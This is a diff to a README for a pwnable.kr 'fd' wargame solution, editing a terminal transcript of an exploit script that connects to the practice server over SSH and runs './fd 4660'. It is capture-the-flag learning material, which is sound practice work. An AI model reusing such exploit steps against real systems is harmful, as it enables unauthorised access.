@@ -1,6 +1,6 @@
 # fd exploit
 ```
- junhoyeo@Macbookui-MacBook-Pro  ~/Documents/pwnable.kr/1. fd   master ●  python3 exploit.py
+ junhoyeo@Macbookui-MacBook-Pro  ~/Documents/pwnable.kr/1. fd   master ●  python3 exploit.py3
 [+] Connecting to pwnable.kr on port 2222: Done
 [+] Downloading './fd.c' to 'fd.c': Found b'/home/fd/fd.c' in ssh cache
 [+] Opening new channel: './fd 4660': Done
